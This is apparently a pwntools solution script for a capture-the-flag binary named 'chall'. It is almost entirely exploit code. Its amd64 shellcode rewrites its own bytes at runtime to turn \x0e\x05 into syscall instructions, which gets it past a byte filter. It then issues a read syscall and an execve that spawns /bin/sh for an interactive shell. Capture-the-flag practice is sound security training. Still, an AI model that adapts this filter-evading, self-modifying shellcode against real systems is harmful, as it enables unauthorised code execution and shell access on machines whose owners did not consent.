from pwn import *

exe = './chall'
context.binary = ELF(exe)
context.arch = "amd64"
def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x00000000004012f5
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

'''
Read syscall:
get the unrestricted shellcode
'''

shellcode = asm("""
    add word ptr [rdx+9], 0x100
    mov rdx, r11
    pop rbx
    """)
shellcode += b"\x0e\x05"

'''
execve the unrestricted shellcode
'''
shellcode += asm("""
    mov al,59
    push rsi
    pop rdi
    add word ptr [rsi+29], 0x100
    xor rsi, rsi
    pop rbx
    mov rdx, rsi
    pop rbx
    """)
shellcode += b"\x0e\x05"

print([bin(i) for i in shellcode])
p.sendline(shellcode)
sleep(1)
p.sendline(b"/bin/sh\x00")

p.interactive()
'''
rbx rdx - odd

'''